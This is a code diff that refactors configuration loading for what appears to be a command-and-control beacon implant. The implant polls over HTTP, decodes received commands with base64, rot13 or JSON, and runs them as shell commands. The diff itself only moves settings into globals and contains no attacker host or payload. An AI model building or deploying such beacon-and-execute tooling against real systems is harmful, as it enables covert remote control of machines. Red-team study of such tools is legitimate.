@@ -39,28 +39,23 @@ def load_config():
         
         # run the parsers. Nothing returns, they just set the values in config.py.
         parse_nodes(config_xml.find(config.NODES_TAG))
-        parse_behaviors(config_xml.find( config.BEHAV_TAG))
-
+        parse_behaviors(config_xml.find(config.BEHAV_TAG))
+        parse_modules(config_xml.find(config.MODULES_TAG))
+        
     except Exception, e:
         print '%s Fatal error parsing XML element - %s' % ( config.PROMPT, e)
         exit()
-
-    beacons = ['http_get']
-    commands = ['shell_command', 'test_command']
-    decoders = ['base64c','rot13','jsonc']
-    encoders = []
-    responders = []
     
     # if no encoders were parsed, just invert the decoders. Effectively says "use the same encoding for responses as was used for the commands
     # received during the beaconing"
-    if len(encoders) == 0:
-            encoders = reversed(decoders)
+    if len(config.ENCODERS) == 0:
+            config.ENCODERS = reversed(config.DECODERS)
     
     # If no responders were parsed use the same nodes that we beacon out to.
-    if len(responders) == 0:
-            responders = beacons
+    if len(config.RESPONDERS) == 0:
+            config.RESPONDERS = config.BEACONS
     
-    return (beacons,commands,decoders,encoders,responders)
+    #return (beacons,commands,decoders,encoders,responders)
     
 def calculate_sleep():
     """
@@ -98,10 +93,10 @@ def start_beacon_loop(controller):
 def main():
     
     print config.PROMPT + " Starting..."
-    beacons, commands, decoders, encoders, responders = load_config()
+    load_config()
     
     print config.PROMPT + " Building controller..."
-    controller = Controller(beacons, commands, decoders, encoders, responders)
+    controller = Controller(config.BEACONS, config.COMMANDS, config.DECODERS, config.ENCODERS, config.RESPONDERS)
     
     print config.PROMPT + " Starting beaconer loop..."
     start_beacon_loop(controller)
